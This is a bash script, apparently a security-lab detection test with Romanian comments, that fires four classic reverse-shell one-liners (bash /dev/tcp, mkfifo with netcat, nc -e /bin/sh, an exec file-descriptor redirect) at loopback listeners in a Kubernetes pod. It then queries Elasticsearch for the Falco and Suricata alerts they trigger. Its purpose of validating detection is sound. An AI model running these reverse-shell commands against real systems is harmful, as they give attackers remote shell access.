#!/bin/bash
# Scenariul 3 - Reverse Shell (T1059)
# Testeaza 4 variante clasice de reverse shell + listener netcat.
# Toate conexiunile sunt pe loopback (127.0.0.1) -> Suricata N/A (trafic intern).

set -e

POD=attack-pod
NS=attack-target
source "$(dirname "$0")/../_env.sh"

echo "=================================================="
echo "Scenariul 3 - Reverse Shell"
echo "Start: $(date +%T)"
echo "=================================================="

START_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
echo "[marker] Start UTC: $START_TS"
echo ""

# ---------------------------------------------------------------------------
# step 1/5 - Netcat listener (asteapta conexiuni 8s, suficient pentru testele 2-4)
# ---------------------------------------------------------------------------
echo "[step 1/5] nc -lnvp 4444 (listener bind shell)"
kubectl exec -n $NS $POD -- bash -c "timeout 8 nc -lnvp 4444 > /tmp/nc1.log 2>&1 &"
sleep 1

# ---------------------------------------------------------------------------
# step 2/5 - bash /dev/tcp reverse shell (clasic, fara binar extern)
# ---------------------------------------------------------------------------
echo "[step 2/5] bash /dev/tcp reverse shell"
kubectl exec -n $NS $POD -- bash -c "timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>&1 || true" | head -3
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 3/5 - mkfifo + named pipe reverse shell (variant clasic, evita restrictii)
# necesita listener nou pentru ca primul a primit deja conexiunea
# ---------------------------------------------------------------------------
echo "[step 3/5] mkfifo + named pipe reverse shell (port 4445)"
kubectl exec -n $NS $POD -- bash -c "timeout 6 nc -lnvp 4445 > /tmp/nc2.log 2>&1 &"
sleep 1
kubectl exec -n $NS $POD -- bash -c "rm -f /tmp/rsf && mkfifo /tmp/rsf && timeout 2 bash -c 'cat /tmp/rsf | bash -i 2>&1 | nc 127.0.0.1 4445 > /tmp/rsf' 2>&1 || true; rm -f /tmp/rsf" | head -3
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 4/5 - nc -e variant (cmdline pattern - executia esueaza pe OpenBSD nc,
# dar regula Falco se declanseaza pe pattern in proc.cmdline al bash-ului parinte)
# ---------------------------------------------------------------------------
echo "[step 4/5] bash -c 'nc -e /bin/sh ...' (cmdline pattern)"
kubectl exec -n $NS $POD -- bash -c "nc -e /bin/sh 127.0.0.1 4446 2>&1 || true" | head -3
echo ""
sleep 1

# ---------------------------------------------------------------------------
# step 5/5 - exec 5<> network FD pattern (alt vector clasic)
# ---------------------------------------------------------------------------
echo "[step 5/5] exec FD-redirect reverse shell pattern"
kubectl exec -n $NS $POD -- bash -c "timeout 6 nc -lnvp 4447 > /tmp/nc3.log 2>&1 &"
sleep 1
kubectl exec -n $NS $POD -- bash -c "timeout 2 bash -c 'exec 5<>/dev/tcp/127.0.0.1/4447; cat <&5 | while read l; do \$l 2>&5 >&5; done' 2>&1 || true" | head -3
echo ""

echo "=================================================="
echo "Atac terminat. Astept 30s pentru propagare ES..."
echo "=================================================="
sleep 30

echo ""
echo "=== Reguli FALCO declansate de la $START_TS ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}},\"by_priority\":{\"terms\":{\"field\":\"log.level\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Sample 8 detectii (cronologic) ==="
curl -s "$ES/security-*/_search?size=8" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"sort\":[{\"@timestamp\":\"asc\"}],\"_source\":[\"@timestamp\",\"rule.name\",\"log.level\",\"output\"]}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for h in d.get('hits',{}).get('hits',[]):
    s = h['_source']
    print(f\"  {s.get('@timestamp','?')[:19]} [{s.get('log',{}).get('level','?'):8}] {s.get('rule',{}).get('name','?')}\")
    out = s.get('output','')
    if out:
        print(f\"    -> {out[:200]}\")
"

echo ""
echo "=== Suricata events (ar trebui 0 - trafic loopback) ==="
echo -n "Suricata count: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"suricata\"}},{\"term\":{\"event_type.keyword\":\"alert\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""

echo ""
echo "End: $(date +%T)"
